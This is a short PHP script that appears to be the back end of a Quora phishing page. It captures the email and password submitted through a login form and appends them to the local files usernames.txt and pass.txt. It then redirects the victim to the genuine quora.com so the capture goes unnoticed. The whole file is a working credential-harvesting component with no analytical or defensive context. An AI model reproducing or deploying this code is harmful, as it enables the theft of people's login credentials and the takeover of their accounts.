<?php

file_put_contents("usernames.txt", "Quora Email : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Quora Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.quora.com');
?>
